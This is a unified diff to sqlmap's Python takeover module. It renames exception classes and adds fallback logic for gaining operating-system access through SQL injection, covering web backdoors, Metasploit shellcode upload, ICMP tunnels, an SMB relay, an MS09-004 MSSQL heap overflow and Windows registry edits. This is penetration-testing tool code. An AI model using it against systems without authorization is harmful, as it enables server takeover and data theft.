@@ -1,27 +1,27 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
 import os
 
 from lib.core.common import Backend
-from lib.core.common import isTechniqueAvailable
+from lib.core.common import isStackingAvailable
 from lib.core.common import readInput
 from lib.core.common import runningAsAdmin
 from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.enums import DBMS
 from lib.core.enums import OS
-from lib.core.enums import PAYLOAD
-from lib.core.exception import sqlmapMissingDependence
-from lib.core.exception import sqlmapMissingMandatoryOptionException
-from lib.core.exception import sqlmapMissingPrivileges
-from lib.core.exception import sqlmapNotVulnerableException
-from lib.core.exception import sqlmapUndefinedMethod
-from lib.core.exception import sqlmapUnsupportedDBMSException
+from lib.core.exception import SqlmapFilePathException
+from lib.core.exception import SqlmapMissingDependence
+from lib.core.exception import SqlmapMissingMandatoryOptionException
+from lib.core.exception import SqlmapMissingPrivileges
+from lib.core.exception import SqlmapNotVulnerableException
+from lib.core.exception import SqlmapUndefinedMethod
+from lib.core.exception import SqlmapUnsupportedDBMSException
 from lib.takeover.abstraction import Abstraction
 from lib.takeover.icmpsh import ICMPsh
 from lib.takeover.metasploit import Metasploit
@@ -41,9 +41,9 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         Abstraction.__init__(self)
 
     def osCmd(self):
-        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) or conf.direct:
+        if isStackingAvailable() or conf.direct:
             web = False
-        elif not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and Backend.isDbms(DBMS.MYSQL):
+        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command execution"
             logger.info(infoMsg)
 
@@ -51,7 +51,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         else:
             errMsg = "unable to execute operating system commands via "
             errMsg += "the back-end DBMS"
-            raise sqlmapNotVulnerableException(errMsg)
+            raise SqlmapNotVulnerableException(errMsg)
 
         self.getRemoteTempPath()
         self.initEnv(web=web)
@@ -63,9 +63,9 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             self.cleanup(web=web)
 
     def osShell(self):
-        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) or conf.direct:
+        if isStackingAvailable() or conf.direct:
             web = False
-        elif not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and Backend.isDbms(DBMS.MYSQL):
+        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
 
@@ -74,7 +74,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             errMsg = "unable to prompt for an interactive operating "
             errMsg += "system shell via the back-end DBMS because "
             errMsg += "stacked queries SQL injection is not supported"
-            raise sqlmapNotVulnerableException(errMsg)
+            raise SqlmapNotVulnerableException(errMsg)
 
         self.getRemoteTempPath()
         self.initEnv(web=web)
@@ -87,6 +87,8 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
 
     def osPwn(self):
         goUdf = False
+        fallbackToWeb = False
+        setupSuccess = False
 
         self.checkDbmsOs()
 
@@ -94,7 +96,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             msg = "how do you want to establish the tunnel?"
             msg += "\n[1] TCP: Metasploit Framework (default)"
             msg += "\n[2] ICMP: icmpsh - ICMP tunneling"
-            valids = ( 1, 2 )
+            valids = (1, 2)
 
             while True:
                 tunnel = readInput(msg, default=1)
@@ -124,16 +126,16 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                 errMsg += "if you want to establish an out-of-band ICMP "
                 errMsg += "tunnel because icmpsh uses raw sockets to "
                 errMsg += "sniff and craft ICMP packets"
-                raise sqlmapMissingPrivileges, errMsg
+                raise SqlmapMissingPrivileges(errMsg)
 
             try:
                 from impacket import ImpactDecoder
                 from impacket import ImpactPacket
-            except ImportError, _:
-                errMsg = "sqlmap requires 'impacket' third-party library "
-                errMsg += "in order to run icmpsh master. Download from "
-                errMsg += "http://oss.coresecurity.com/projects/impacket.html"
-                raise sqlmapMissingDependence, errMsg
+            except ImportError:
+                errMsg = "sqlmap requires 'python-impacket' third-party library "
+                errMsg += "in order to run icmpsh master. You can get it at "
+                errMsg += "http://code.google.com/p/impacket/downloads/list"
+                raise SqlmapMissingDependence(errMsg)
 
             sysIgnoreIcmp = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
 
@@ -150,17 +152,18 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                 errMsg += "is unlikely to receive commands sent from you"
                 logger.error(errMsg)
 
-            if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
+            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                 self.sysUdfs.pop("sys_bineval")
 
-        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) or conf.direct:
+        self.getRemoteTempPath()
+
+        if isStackingAvailable() or conf.direct:
             web = False
 
-            self.getRemoteTempPath()
             self.initEnv(web=web)
 
             if tunnel == 1:
-                if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
+                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                     msg = "how do you want to execute the Metasploit shellcode "
                     msg += "on the back-end database underlying operating system?"
                     msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
@@ -169,11 +172,11 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     while True:
                         choice = readInput(msg, default=1)
 
-                        if isinstance(choice, basestring) and choice.isdigit() and int(choice) in ( 1, 2 ):
+                        if isinstance(choice, basestring) and choice.isdigit() and int(choice) in (1, 2):
                             choice = int(choice)
                             break
 
-                        elif isinstance(choice, int) and choice in ( 1, 2 ):
+                        elif isinstance(choice, int) and choice in (1, 2):
                             break
 
                         else:
@@ -184,31 +187,48 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                         goUdf = True
 
                 if goUdf:
-                    exitfunc="thread"
+                    exitfunc = "thread"
+                    setupSuccess = True
                 else:
-                    exitfunc="process"
+                    exitfunc = "process"
 
                 self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
 
                 if not goUdf:
-                    self.uploadShellcodeexec()
+                    setupSuccess = self.uploadShellcodeexec(web=web)
 
-                if Backend.isOs(OS.WINDOWS) and conf.privEsc:
-                    if Backend.isDbms(DBMS.MYSQL):
-                        debugMsg = "by default MySQL on Windows runs as SYSTEM "
-                        debugMsg += "user, no need to privilege escalate"
-                        logger.debug(debugMsg)
+                    if setupSuccess is not True:
+                        if Backend.isDbms(DBMS.MYSQL):
+                            fallbackToWeb = True
+                        else:
+                            msg = "unable to mount the operating system takeover"
+                            raise SqlmapFilePathException(msg)
+
+                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
+                    debugMsg = "by default MySQL on Windows runs as SYSTEM "
+                    debugMsg += "user, no need to privilege escalate"
+                    logger.debug(debugMsg)
+
             elif tunnel == 2:
-                self.uploadIcmpshSlave(web=web)
-                self.icmpPwn()
+                setupSuccess = self.uploadIcmpshSlave(web=web)
 
-        elif not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and Backend.isDbms(DBMS.MYSQL):
+                if setupSuccess is not True:
+                    if Backend.isDbms(DBMS.MYSQL):
+                        fallbackToWeb = True
+                    else:
+                        msg = "unable to mount the operating system takeover"
+                        raise SqlmapFilePathException(msg)
+
+        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
             web = True
 
-            infoMsg = "going to use a web backdoor to establish the tunnel"
+            if fallbackToWeb:
+                infoMsg = "falling back to web backdoor to establish the tunnel"
+            else:
+                infoMsg = "going to use a web backdoor to establish the tunnel"
             logger.info(infoMsg)
 
-            self.initEnv(web=web)
+            self.initEnv(web=web, forceInit=fallbackToWeb)
 
             if self.webBackdoorUrl:
                 if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
@@ -221,22 +241,29 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     warnMsg += "back-end DBMS underlying system is not Windows"
                     logger.warn(warnMsg)
 
-                self.getRemoteTempPath()
-
                 if tunnel == 1:
                     self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
-                    self.uploadShellcodeexec(web=web)
-                elif tunnel == 2:
-                    self.uploadIcmpshSlave(web=web)
-                    self.icmpPwn()
-        else:
-            errMsg = "unable to prompt for an out-of-band session because "
-            errMsg += "stacked queries SQL injection is not supported"
-            raise sqlmapNotVulnerableException(errMsg)
+                    setupSuccess = self.uploadShellcodeexec(web=web)
 
-        if tunnel == 1:
-            if not web or (web and self.webBackdoorUrl is not None):
+                    if setupSuccess is not True:
+                        msg = "unable to mount the operating system takeover"
+                        raise SqlmapFilePathException(msg)
+
+                elif tunnel == 2:
+                    setupSuccess = self.uploadIcmpshSlave(web=web)
+
+                    if setupSuccess is not True:
+                        msg = "unable to mount the operating system takeover"
+                        raise SqlmapFilePathException(msg)
+
+        if setupSuccess:
+            if tunnel == 1:
                 self.pwn(goUdf)
+            elif tunnel == 2:
+                self.icmpPwn()
+        else:
+            errMsg = "unable to prompt for an out-of-band session"
+            raise SqlmapNotVulnerableException(errMsg)
 
         if not conf.cleanup:
             self.cleanup(web=web)
@@ -248,14 +275,14 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             errMsg = "the back-end DBMS underlying operating system is "
             errMsg += "not Windows: it is not possible to perform the SMB "
             errMsg += "relay attack"
-            raise sqlmapUnsupportedDBMSException(errMsg)
+            raise SqlmapUnsupportedDBMSException(errMsg)
 
-        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and not conf.direct:
-            if Backend.getIdentifiedDbms() in ( DBMS.PGSQL, DBMS.MSSQL ):
+        if not isStackingAvailable() and not conf.direct:
+            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                 errMsg = "on this back-end DBMS it is only possible to "
                 errMsg += "perform the SMB relay attack if stacked "
                 errMsg += "queries are supported"
-                raise sqlmapUnsupportedDBMSException(errMsg)
+                raise SqlmapUnsupportedDBMSException(errMsg)
 
             elif Backend.isDbms(DBMS.MYSQL):
                 debugMsg = "since stacked queries are not supported, "
@@ -292,7 +319,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         self.smb()
 
     def osBof(self):
-        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and not conf.direct:
+        if not isStackingAvailable() and not conf.direct:
             return
 
         if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
@@ -300,7 +327,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             errMsg += "2000 or 2005 to be able to exploit the heap-based "
             errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
             errMsg += "stored procedure (MS09-004)"
-            raise sqlmapUnsupportedDBMSException(errMsg)
+            raise SqlmapUnsupportedDBMSException(errMsg)
 
         infoMsg = "going to exploit the Microsoft SQL Server %s " % Backend.getVersion()
         infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
@@ -325,10 +352,10 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
     def uncPathRequest(self):
         errMsg = "'uncPathRequest' method must be defined "
         errMsg += "into the specific DBMS plugin"
-        raise sqlmapUndefinedMethod, errMsg
+        raise SqlmapUndefinedMethod(errMsg)
 
-    def __regInit(self):
-        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and not conf.direct:
+    def _regInit(self):
+        if not isStackingAvailable() and not conf.direct:
             return
 
         self.checkDbmsOs()
@@ -336,13 +363,13 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         if not Backend.isOs(OS.WINDOWS):
             errMsg = "the back-end DBMS underlying operating system is "
             errMsg += "not Windows"
-            raise sqlmapUnsupportedDBMSException(errMsg)
+            raise SqlmapUnsupportedDBMSException(errMsg)
 
         self.initEnv()
         self.getRemoteTempPath()
 
     def regRead(self):
-        self.__regInit()
+        self._regInit()
 
         if not conf.regKey:
             default = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
@@ -364,7 +391,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         return self.readRegKey(regKey, regVal, True)
 
     def regAdd(self):
-        self.__regInit()
+        self._regInit()
 
         errMsg = "missing mandatory option"
 
@@ -373,7 +400,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             regKey = readInput(msg)
 
             if not regKey:
-                raise sqlmapMissingMandatoryOptionException(errMsg)
+                raise SqlmapMissingMandatoryOptionException(errMsg)
         else:
             regKey = conf.regKey
 
@@ -382,7 +409,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             regVal = readInput(msg)
 
             if not regVal:
-                raise sqlmapMissingMandatoryOptionException(errMsg)
+                raise SqlmapMissingMandatoryOptionException(errMsg)
         else:
             regVal = conf.regVal
 
@@ -391,7 +418,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             regData = readInput(msg)
 
             if not regData:
-                raise sqlmapMissingMandatoryOptionException(errMsg)
+                raise SqlmapMissingMandatoryOptionException(errMsg)
         else:
             regData = conf.regData
 
@@ -412,7 +439,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         self.addRegKey(regKey, regVal, regType, regData)
 
     def regDel(self):
-        self.__regInit()
+        self._regInit()
 
         errMsg = "missing mandatory option"
 
@@ -421,7 +448,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             regKey = readInput(msg)
 
             if not regKey:
-                raise sqlmapMissingMandatoryOptionException(errMsg)
+                raise SqlmapMissingMandatoryOptionException(errMsg)
         else:
             regKey = conf.regKey
 
@@ -430,7 +457,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             regVal = readInput(msg)
 
             if not regVal:
-                raise sqlmapMissingMandatoryOptionException(errMsg)
+                raise SqlmapMissingMandatoryOptionException(errMsg)
         else:
             regVal = conf.regVal
 
@@ -438,7 +465,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
         output = readInput(message, default="N")
 
-        if output and output[0] not in ( "Y", "y" ):
+        if output and output[0] not in ("Y", "y"):
             return
 
         infoMsg = "deleting Windows registry path '%s\%s'. " % (regKey, regVal)
